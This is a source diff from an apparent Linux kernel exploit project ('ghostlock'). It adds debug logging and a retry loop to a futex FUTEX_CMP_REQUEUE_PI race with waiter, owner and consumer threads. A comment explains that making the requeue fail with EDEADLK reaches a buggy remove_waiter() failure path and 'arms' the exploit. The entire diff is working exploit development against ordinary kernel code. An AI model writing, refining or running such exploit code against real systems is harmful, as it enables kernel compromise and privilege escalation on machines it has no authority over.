@@ -44,9 +44,11 @@ namespace ghostlock::race {
                 timeout.tv_nsec -= 1000000000L;
             }
         }
+        pr_info("[dbg] waiter entering WAIT_REQUEUE_PI wait_futex=%d target_futex=%d\n", race->wait_futex, race->target_futex);
         race->waiter_waiting.store(1);
-        support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+        long wr_ret = support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &race->target_futex, 0);
+        pr_info("[dbg] waiter WAIT_REQUEUE_PI returned ret=%ld errno=%d\n", wr_ret, errno);
         route::RouteController controller;
         controller.init(race, &session::g_exploit_session.profile);
         race->route_status = controller.execute(request);
@@ -75,8 +77,10 @@ namespace ghostlock::race {
     void *owner_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
         support::disable_rseq_for_thread();
+        pr_info("[dbg] owner entering LOCK_PI target_futex=%d\n", race->target_futex);
         long lock_target = support::futex_op(
             &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
+        pr_info("[dbg] owner LOCK_PI returned ret=%ld errno=%d\n", lock_target, errno);
         if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
         while (!race->waiter_ready.load() &&
                !race->owner_stop.load())
@@ -87,6 +91,13 @@ namespace ghostlock::race {
             return nullptr;
         }
         race->owner_started.store(1);
+        /* REVERTED (HANDOFF 19): the 300 ms settle here was WRONG.  This thread
+         * must already be PI-blocked on chain_futex (held by the waiter) when
+         * the requeue is issued: that dependency is what makes
+         * CMP_REQUEUE_PI fail with EDEADLK (35), which routes the requeue
+         * through rt_mutex_start_proxy_lock()'s failure path and the buggy
+         * remove_waiter() -- i.e. it is the ARM condition, not an error.  With
+         * the settle the requeue returned 1 and nothing was ever armed. */
         support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
         race->owner_chain_done.store(1);
         while (!race->owner_stop.load()) sleep(1);
@@ -114,6 +125,7 @@ namespace ghostlock::race {
             seen = seq;
             int32_t tid = race->waiter_tid.load();
             int32_t calls_this_seq = 0;
+            pr_info("[dbg] cons released seq=%d tid=%d\n", seq, tid);
             while (!race->consumer_stop.load() &&
                    race->consumer_go.load() == seq) {
                 uint32_t delay_usec = race->route_delay_usec.load();
@@ -131,7 +143,11 @@ namespace ghostlock::race {
                     int32_t consumer_nice = session::g_exploit_session.profile.has_compact_waiter()
                                             ? (calls_this_seq % 19) + 1
                                             : kernel::PSELECT_CONSUMER_NICE;
+                    pr_info("[dbg] cons#%d nice=%d tid=%d -> sched_setattr\n",
+                            calls_this_seq, consumer_nice, tid);
                     long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
+                    pr_info("[dbg] cons#%d raw sched_ret=%ld errno=%d\n",
+                            calls_this_seq, sched_ret, errno);
                     if (sched_ret != 0) {
                         struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
                         long fret = support::futex_op(
@@ -141,9 +157,14 @@ namespace ghostlock::race {
                                 &race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
                             sched_ret = 0;
                         }
+                        pr_info("[dbg] cons#%d fallback fret=%ld errno=%d -> sched_ret=%ld\n",
+                                calls_this_seq, fret, errno, sched_ret);
                     }
                     if (sched_ret == 0) race->consumer_success.fetch_add(1);
                     race->consumer_inflight.store(0);
+                    pr_info("[dbg] cons#%d done success=%d calls=%d\n",
+                            calls_this_seq, race->consumer_success.load(),
+                            race->consumer_calls.load());
                     calls_this_seq++;
                     if (static_cast<uint32_t>(calls_this_seq) >=
                         session::g_exploit_session.profile.select_consumer_max_calls()) {
@@ -178,10 +199,25 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
     usleep(fast_repair.load()
                ? 5000
                : session::g_exploit_session.profile.race_setup_settle_us());
+    pr_info("[dbg] requeue pre: *wait_futex=%u *target_futex=%u waiter_tid=%d\n",
+            wait_futex, target_futex, waiter_tid.load());
     errno = 0;
     long rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                                 reinterpret_cast<void *>(1),
                                 &target_futex, 0);
+    pr_info("[dbg] requeue try=0 ret=%ld errno=%d *wait_futex=%u *target_futex=%u\n",
+            rq, errno, wait_futex, target_futex);
+    /* success is ret >= 1 (one waiter requeued); only retry real errors */
+    for (int32_t requeue_try = 1; rq < 0 && requeue_try <= 200; requeue_try++) {
+        usleep(1000);
+        errno = 0;
+        rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
+                               reinterpret_cast<void *>(1),
+                               &target_futex, 0);
+        if (requeue_try <= 12 || (requeue_try % 50) == 0)
+            pr_info("[dbg] requeue try=%d ret=%ld errno=%d *wait_futex=%u *target_futex=%u\n",
+                    requeue_try, rq, errno, wait_futex, target_futex);
+    }
     pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
             rq, errno);
     /* TODO(pi-timeout-01): This wait has no deadline. A route that stalls in
@@ -220,6 +256,7 @@ namespace ghostlock::race {
         pr_info("[route] creating waiter/owner/consumer\n");
         int32_t error = session::g_exploit_session.race.start_threads(
             waiter_thread, owner_thread, consumer_thread, &request);
+        pr_info("[route] threads started error=%d\n", error);
         if (error) {
             if (session::g_exploit_session.race.route_status.code ==
                 route::ROUTE_DIRTY_FAILURE) {
@@ -234,7 +271,9 @@ namespace ghostlock::race {
             pr_warning("PI race thread creation failed errno=%d\n", error);
             return 0;
         }
+        pr_info("[dbg] race.run enter\n");
         route::RouteStatus status = session::g_exploit_session.race.run();
+        pr_info("[dbg] race.run done code=%d step=%d errno=%d\n", status.code, status.step, status.error_number);
         if (status.code == route::ROUTE_DIRTY_FAILURE) {
             support::fail_stop_dirty_race("route_done deadline", status.error_number);
         }
